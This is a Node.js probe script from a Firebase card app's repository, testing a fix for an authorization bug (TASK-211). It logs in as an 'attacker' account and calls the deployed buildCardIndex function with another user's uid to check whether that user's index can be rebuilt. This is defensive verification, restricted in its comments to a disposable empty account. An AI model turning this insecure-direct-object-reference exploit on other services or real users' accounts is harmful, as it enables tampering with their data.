#!/usr/bin/env node
/**
 * TASK-211 — empirical before/after probe for the buildCardIndex authz bug.
 *
 * Logs in as account A (attacker) and invokes the DEPLOYED buildCardIndex
 * Cloud Function passing account B's uid in the payload — the exact shape
 * the vulnerable client code never sent, but the vulnerable server code
 * happily accepted (`request.data?.userId || request.auth.uid`).
 *
 * DESIGN CONSTRAINT (do not violate): account B MUST be a disposable, EMPTY
 * (0 cards) account created for this probe. Never point ACCOUNT_B_UID at
 * TEST_USER_A (CI account, ~59k cards, ~113s rebuild, collides with E2E) or
 * at the personal srparca account. On an empty account the rebuild is
 * instant and inofensive, and proves exactly the same thing.
 *
 * This script does NOT run itself (no `firebase` in this agent's Bash
 * allowlist, and no disposable account B exists yet). See the printed
 * instructions / the TASK-211 hand-off for the exact commands to run.
 *
 * Usage:
 *   FIREBASE_PROJECT=cranial-trading-dev \
 *   VITE_FIREBASE_API_KEY=... \
 *   ATTACKER_EMAIL=accountA@example.com \
 *   ATTACKER_PASSWORD=... \
 *   ACCOUNT_B_UID=<uid of the disposable empty account> \
 *   node scripts/build-card-index-authz-probe.mjs
 *
 * WHAT TO EXPECT:
 *   BEFORE the TASK-211 fix (functions/index.js still on the vulnerable
 *   `request.data?.userId || request.auth.uid` line, deployed):
 *     - HTTP 200, `result.success: true`
 *     - users/{ACCOUNT_B_UID}/card_index gets rebuilt (touch account B's
 *       collection first — e.g. add one card via the app — so a rebuild is
 *       observable; check `updatedAt` on the index chunk before/after)
 *
 *   AFTER the fix (userId parameter removed, function always uses
 *   request.auth.uid):
 *     - Still HTTP 200 — the fix silently ignores the userId in the
 *       payload rather than rejecting it (see TASK-211 hand-off: this is a
 *       deliberate deviation from AC3's literal "falla con
 *       permission-denied" wording — no legitimate caller ever sent
 *       userId, so the safer fix is to delete the parameter rather than
 *       validate-and-reject it. There is no error path left to distinguish
 *       "victim exists" from "victim doesn't exist" either, which also
 *       closes the enumeration angle noted in the ticket).
 *     - users/{ACCOUNT_B_UID}/card_index is UNCHANGED — the rebuild instead
 *       touches users/{attacker's own uid}/card_index, regardless of what
 *       userId was sent.
 */

const projectId = process.env.FIREBASE_PROJECT;
const apiKey = process.env.VITE_FIREBASE_API_KEY;
const email = process.env.ATTACKER_EMAIL;
const password = process.env.ATTACKER_PASSWORD;
const victimUid = process.env.ACCOUNT_B_UID;

if (!projectId || !apiKey || !email || !password || !victimUid) {
  console.error(
    'Faltan variables. Requeridas: FIREBASE_PROJECT, VITE_FIREBASE_API_KEY, ' +
      'ATTACKER_EMAIL, ATTACKER_PASSWORD, ACCOUNT_B_UID.'
  );
  process.exit(1);
}

async function main() {
  console.log(`Proyecto: ${projectId}`);
  console.log(`Atacante: ${email}`);
  console.log(`Victima (uid pasado en el payload): ${victimUid}`);

  const loginRes = await fetch(
    `https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=${apiKey}`,
    {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, password, returnSecureToken: true }),
    }
  );
  if (!loginRes.ok) {
    throw new Error(`Login fallido: HTTP ${loginRes.status}`);
  }
  const { idToken, localId: attackerUid } = await loginRes.json();

  if (attackerUid === victimUid) {
    console.error('ACCOUNT_B_UID es igual a la cuenta atacante — no prueba nada. Abortado.');
    process.exit(1);
  }

  const region = process.env.FIREBASE_FUNCTIONS_REGION || 'us-central1';
  console.log(
    `Invocando buildCardIndex desplegada con { userId: "${victimUid}" } ` +
      `logueado como ${attackerUid}...`
  );

  const fnRes = await fetch(
    `https://${region}-${projectId}.cloudfunctions.net/buildCardIndex`,
    {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Authorization: `Bearer ${idToken}`,
      },
      body: JSON.stringify({ data: { userId: victimUid } }),
    }
  );

  const body = await fnRes.text();
  console.log(`HTTP ${fnRes.status}`);
  console.log(body);

  if (!fnRes.ok) {
    console.log(
      '\n→ Rechazado. Compatible con el fix aplicado en TASK-211 SI ademas ' +
        'confirmaste a mano que el indice de la cuenta atacante tampoco se tocó ' +
        'inesperadamente, o con un fix de validate-and-reject alternativo.'
    );
    return;
  }

  console.log(
    '\n→ HTTP 200. Esto NO alcanza para decidir "vulnerable" vs "arreglado": ' +
      'inspecciona a mano cual card_index quedo tocado (mira `updatedAt` en ' +
      `users/${victimUid}/card_index/chunk_0 y en users/${attackerUid}/card_index/chunk_0). ` +
      'Si se tocó el de la víctima → vulnerable (ANTES del fix). Si se tocó el ' +
      'del atacante (o no había nada que tocar porque el atacante no tiene ' +
      'cartas) → arreglado (DESPUES del fix, comportamiento esperado tras ' +
      'TASK-211).'
  );
}

main().catch((err) => {
  console.error(err);
  process.exit(1);
});
